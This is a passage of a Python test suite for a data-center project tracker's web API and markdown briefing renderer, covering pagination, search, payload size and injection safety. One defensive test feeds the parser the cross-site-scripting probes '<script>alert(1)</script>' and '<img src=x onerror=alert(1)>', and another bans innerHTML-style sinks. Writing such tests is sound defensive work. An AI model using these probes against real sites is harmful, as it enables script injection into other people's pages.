    `total` is the count for the filter, not for the page. The reader is told
    "30 of 70" and the scroll knows when to stop asking; a `total` that meant the
    page would make an infinite list that ends after one screen.
    """
    _status, page = request(paged, "/api/projects")
    assert len(page["rows"]) == 30
    assert page["total"] == 71
    assert page["offset"] == 0


def test_the_next_page_continues_rather_than_repeats(paged):
    """Two pages, no row on both, and the pair in one continuous order."""
    _status, first = request(paged, "/api/projects?sort=mw_planned&dir=desc")
    _status, second = request(paged, "/api/projects?sort=mw_planned&dir=desc&offset=30")

    ids_one = [r["id"] for r in first["rows"]]
    ids_two = [r["id"] for r in second["rows"]]
    assert len(ids_two) == 30
    assert not set(ids_one) & set(ids_two), "a row appeared on two pages"

    joined = [
        r["mw_planned"] for r in first["rows"] + second["rows"] if r["mw_planned"] is not None
    ]
    assert joined == sorted(joined, reverse=True), "the second page restarts the ordering"


def test_a_sorted_column_puts_its_empties_last_either_way(paged):
    """Ascending by capacity opens with the smallest figure somebody cited.

    Not with twenty-three dashes. This is the front end's old rule and the right
    one: an empty cell is not a small number, and sorting it as one buries the
    data under the gaps.
    """
    for direction in ("asc", "desc"):
        _status, page = request(paged, f"/api/projects?sort=mw_planned&dir={direction}&limit=200")
        values = [r["mw_planned"] for r in page["rows"]]
        filled = [v for v in values if v is not None]
        assert values[: len(filled)] == filled, f"an empty sorted before a figure ({direction})"
        assert filled == sorted(filled, reverse=direction == "desc")


def test_the_page_size_is_capped_and_a_bad_query_is_refused(paged):
    """A clamp where the caller still gets rows; a 400 where they would be lied to."""
    _status, page = request(paged, "/api/projects?limit=100000")
    assert len(page["rows"]) <= 200, "an unbounded limit reinstates the whole download"

    # A misspelled sort key must not fall back to a default. The header would say
    # "sorted by investment" over rows sorted by something else.
    assert request(paged, "/api/projects?sort=nonesuch")[0] == 400
    assert request(paged, "/api/projects?dir=sideways")[0] == 400
    assert request(paged, "/api/projects?offset=-1")[0] == 400
    assert request(paged, "/api/projects?offset=nope")[0] == 400


def test_search_narrows_word_by_word(paged):
    """Two words narrow rather than widen — every one of them has to appear."""
    _status, one = request(paged, "/api/projects?q=meta&limit=200")
    _status, two = request(paged, "/api/projects?q=meta%20columbus&limit=200")
    assert one["total"] > 0
    assert two["total"] <= one["total"]
    assert {r["id"] for r in two["rows"]} <= {r["id"] for r in one["rows"]}

    _status, none = request(paged, "/api/projects?q=meta%20nowhere&limit=200")
    assert none["total"] == 0


def test_a_hashed_number_is_the_id_and_a_bare_one_is_not(paged):
    """`#42` is the row. `42` is also a capacity, a year, and part of a name.

    The distinction was the front end's and is kept: a reader who knows the id
    can reach it past a name containing the same digits, and a reader typing a
    number they saw in a cell still finds the cell.
    """
    _status, exact = request(paged, "/api/projects?q=%2342")
    assert [r["id"] for r in exact["rows"]] == [42]

    _status, loose = request(paged, "/api/projects?q=42&limit=200")
    assert loose["total"] > 1, "a bare number should still be a substring match"
    assert 42 in {r["id"] for r in loose["rows"]}
    assert "Route 42 Campus" in {r["name"] for r in loose["rows"]}


def test_a_wildcard_in_the_query_is_a_character_and_not_a_wildcard(paged):
    """`%` typed into the box means the character. Unescaped it matches everything,
    and the table quietly returns rows containing nothing the reader typed."""
    _status, page = request(paged, "/api/projects?q=%25&limit=200")
    assert page["total"] == 0


def test_the_obstacle_filters_ask_about_open_risks(server):
    """A resolved permitting fight is history, not a current permitting risk."""
    address, _ = server
    _status, all_rows = request(address, "/api/projects")
    assert all_rows["total"] == 1

    _status, filtered = request(address, "/api/projects?risk=nonesuch")
    assert filtered["total"] == 0
    _status, filtered = request(address, "/api/projects?severity=blocking")
    assert filtered["total"] in (0, 1)


def test_quoted_only_keeps_the_rows_whose_figures_are_quoted(server, seeded_db):
    """The one filter that cannot be a WHERE clause, and it must still be exact.

    Provenance is derived from a project's sources every time it is asked for —
    there is no column to compare — so this is computed and memoised. The risk of
    a set computed separately from the rows is that it stops agreeing with the
    tiers the same rows display, so it is checked against them here.
    """
    address, _ = server
    _status, listing = request(address, "/api/projects?limit=200")
    unquoted = {"unconfirmed", "inferred", "defaulted"}
    expected = set()
    for row in listing["rows"]:
        tiers = [
            (row["prov"].get(f) or {}).get("tier") or "reported"
            for f in TRACKED_FIELDS
            if row.get(f) not in (None, "")
        ]
        if not any(t in unquoted for t in tiers):
            expected.add(row["id"])

    _status, quoted = request(address, "/api/projects?quoted=1&limit=200")
    assert {r["id"] for r in quoted["rows"]} == expected
    assert quoted["total"] == len(expected)


def test_the_shell_payload_carries_no_per_project_detail(server):
    """What made the console slower with every ingest.

    Nine point seven kilobytes of wire per project, two thirds of it detail no
    list view can show, all of it required to land before the first row could be
    drawn. The index that remains is what the maps need, and a row of it should
    stay small enough that four hundred of them are not a download.
    """
    address, _ = server
    _status, data = request(address, "/api/dataset")
    listed = data["projects"][0]
    for absent in ("sources", "events", "blocks", "parties", "prov", "standing", "claims_by_field"):
        assert absent not in listed, f"{absent} is back in the shell payload"
    assert len(json.dumps(listed)) < 1500, "an index row has grown into a project"
    assert "capex" not in data, "the rollup is the costliest read and one view of six reads it"


def test_the_shell_payload_does_not_say_where_the_database_is(server, seeded_db):
    """`/api/dataset` sent every reader the host's absolute database path.

    Nothing in the page read it. Behind a tunnel that was a stranger with an
    account learning the host's directory layout — its user name, among other
    things — for no benefit. The terminal interface still gets it: `build()` runs
    in-process on the machine the path describes.
    """
    from tracker.db import open_db, session_scope
    from tracker.webui.dataset import build

    address, _ = server
    _status, _headers, body = raw(address, "/api/dataset")
    assert "db" not in json.loads(body)
    assert seeded_db.parent.name not in body, "the path is in there under another name"

    with session_scope(open_db(seeded_db), commit=False) as session:
        assert build(session, db_path=str(seeded_db), schema_version=1)["db"] == str(seeded_db)


def test_the_citations_list_is_publishers_until_one_is_opened(server):
    """A count per outlet at rest; the articles when a card is expanded.

    Shipping every article so that one card can be opened is the mistake this
    whole change is undoing, one level down: measured on a 437-project fleet it
    is 1.25 MB to show what a click needs 40 KB of.

    Grouped by the registrable domain the CLI prints, rather than by the
    browser's old "last two labels" rule — which turned `bbc.co.uk` into `co.uk`
    and attached the measured record to the wrong host.
    """
    address, _ = server
    status, payload = request(address, "/api/articles")
    assert status == 200
    assert payload["totals"]["articles"] >= 1
    listing = {g["host"]: g for g in payload["publishers"]}
    assert "microsoft.com" in listing
    entry = listing["microsoft.com"]
    assert isinstance(entry["articles"], int) and entry["articles"] >= 1
    assert entry["loaded"] is None, "the resting list carries counts, not articles"

    _status, opened = request(address, "/api/articles?host=microsoft.com")
    group = next(g for g in opened["publishers"] if g["host"] == "microsoft.com")
    assert len(group["loaded"]) == entry["articles"]
    article = group["loaded"][0]
    assert article["url"] and article["publisher"] == "microsoft.com"
    assert article["projects"] and article["projects"][0]["id"]
    # Not the excerpt and not the claims blob: neither is rendered, and together
    # they are most of a source row.
    assert "excerpt" not in article and "claims" not in article


def test_searching_the_citations_reaches_inside_the_articles(server):
    """The browser's filter read the excerpt, so this has to as well.

    A search that silently stopped looking somewhere would be the worst kind of
    regression here: it returns rows, they are all correct, and the ones it can
    no longer see are invisible by definition.
    """
    address, _ = server
    _status, by_host = request(address, "/api/articles?q=microsoft")
    assert by_host["totals"]["matched"] >= 1
    assert by_host["publishers"][0]["loaded"], "a search result must arrive expanded"

    # "will draw 900" is in the stored excerpt and in no URL and no host. A plain
    # substring, as the browser's article filter was — not the word-AND the
    # project table uses, because this box says "publisher or URL" and a reader
    # pasting a phrase from an article expects to find that article.
    _status, by_excerpt = request(address, "/api/articles?q=will+draw+900")
    assert by_excerpt["totals"]["matched"] == 1, "the excerpt must be searched"
    assert by_excerpt["publishers"][0]["host"] == "microsoft.com"

    _status, split = request(address, "/api/articles?q=900+will")
    assert split["totals"]["matched"] == 0, "a substring is not a bag of words"

    _status, nothing = request(address, "/api/articles?q=nosuchpublisher")
    assert nothing["totals"]["matched"] == 0
    assert nothing["publishers"] == []


# --- The briefing's markdown, and the rule that survived it ------------------
#
# The panel renders a model's prose. That string is written out of articles
# fetched from the open web, which makes it the least trustworthy text on the
# page: anything turning it into markup is an injection path running from someone
# else's site, through the extraction pipeline, into a console that holds an
# operator's session.
#
# The renderer grew from four constructs to headings, tables, nested lists, quotes
# and fenced code when the prompt started asking for an analytical briefing. The
# growth is the risk — the easy way to support markdown is to hand a string to a
# library and set `innerHTML`, and that is precisely the shape this must not have.


def test_the_briefing_renderer_never_reaches_for_innerhtml():
    """Growing the markdown subset must never become "parse it and assign HTML".

    Every branch has to emit a React element or a string, so a `<script>` in a
    briefing renders as characters. This is the one property the panel cannot
    trade for features, and it is cheap to pin.
    """
    source = (assets.STATIC_ROOT / "app.js").read_text(encoding="utf-8")
    for banned in ("dangerouslySetInnerHTML", "innerHTML", "outerHTML", "insertAdjacentHTML"):
        assert banned not in source, f"app.js reaches for {banned}"


def test_the_briefing_renderer_flattens_links():
    """A clickable destination chosen by a model reading an untrusted page is a
    phishing surface. The citations under the panel are the real links and they
    come from the database."""
    source = (assets.STATIC_ROOT / "app.js").read_text(encoding="utf-8")
    assert r"\[([^\]]*)\]\((?:[^()]|\([^()]*\))*\)" in source, "the link-flattening rule is gone"
    assert "<a " not in source.split("function renderMarkdown")[0].split("const MD_INLINE")[-1]


def _node() -> str | None:
    import shutil

    return shutil.which("node")


def _parse_markdown(document: str):
    """Run the console's own block parser under node, and hand back its output.

    The parser is the riskiest new code in the panel and there is no JS test
    harness in this repo, so it is exercised where it actually runs rather than
    reimplemented in Python — a second copy of the rules would pass while the
    shipped one was wrong.
    """
    import json
    import subprocess
    import tempfile
    from pathlib import Path

    source = (assets.STATIC_ROOT / "app.js").read_text(encoding="utf-8")
    start = source.index("const MD_INLINE =")
    end = source.index("function mdRender(")
    with tempfile.TemporaryDirectory() as tmp:
        module = Path(tmp) / "parser.mjs"
        # `mdInline` needs the templating tag; the block parser does not touch it.
        module.write_text(
            "const html = (s, ...v) => ({ s, v });\n"
            + source[start:end]
            + "\nexport { mdBlocks };\n",
            encoding="utf-8",
        )
        runner = Path(tmp) / "run.mjs"
        runner.write_text(
            f"import {{ mdBlocks }} from {json.dumps(module.as_uri())};\n"
            "let input = '';\n"
            "process.stdin.on('data', (d) => (input += d));\n"
            "process.stdin.on('end', () => "
            "process.stdout.write(JSON.stringify(mdBlocks(JSON.parse(input).split('\\n')))));\n",
            encoding="utf-8",
        )
        done = subprocess.run(
            [_node(), str(runner)],
            input=json.dumps(document),
            capture_output=True,
            text=True,
            timeout=60,
        )
    assert done.returncode == 0, done.stderr
    return json.loads(done.stdout)


needs_node = pytest.mark.skipif(_node() is None, reason="node is not installed")


@needs_node
def test_a_script_tag_in_a_briefing_stays_text():
    """The injection path, tested at the parser rather than asserted about it."""
    blocks = _parse_markdown("<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>")
    assert all(b["type"] == "p" for b in blocks)
    assert blocks[0]["text"] == "<script>alert(1)</script>"


@needs_node
def test_the_parser_reads_the_shape_the_prompt_asks_for():
    """Headings, a table with alignment, nested lists and a quote — the four the
    analytical briefing is built from."""
    blocks = _parse_markdown(
        "Opening prose.\n\n"
        "## Read of the build\n\n"
        "| Track | Reached |\n| --- | ---: |\n| Power | nothing |\n\n"
        "## What would move it\n\n"
        "1. An interconnection agreement\n"
        "   - the queue runs years\n"
        "2. A named tenant\n\n"
        "> The capacity is not cited.\n"
    )
    kinds = [b["type"] for b in blocks]
    assert kinds == ["p", "h", "table", "h", "list", "quote"]

    table = blocks[2]
    assert table["head"] == ["Track", "Reached"]
    assert table["align"] == ["left", "right"]
    assert table["rows"] == [["Power", "nothing"]]

    ordered = blocks[4]
    assert ordered["ordered"] is True
    nested = ordered["items"][0]["children"][0]
    assert nested["ordered"] is False
    assert nested["items"][0]["text"] == "the queue runs years"


@needs_node
def test_a_rule_under_a_paragraph_is_not_mistaken_for_a_table():
    """`---` is both a horizontal rule and a table's alignment row. The divider is
    only ever tested against the line following a candidate header, so a rule
    under ordinary prose stays a rule."""
    blocks = _parse_markdown("Opening prose.\n---\nMore prose.")
    assert [b["type"] for b in blocks] == ["p", "hr", "p"]


@needs_node
def test_a_half_written_briefing_renders_what_arrived():
    """Every frame of a stream is a partial document, and none of them may render
    as a blank panel — a briefing that appears to vanish mid-write reads as a
    crash."""
    for cut in ("## Read of the b", "| Track | Reach", "```\nlet x =", "- **Power"):
        assert _parse_markdown(cut), f"{cut!r} rendered nothing"
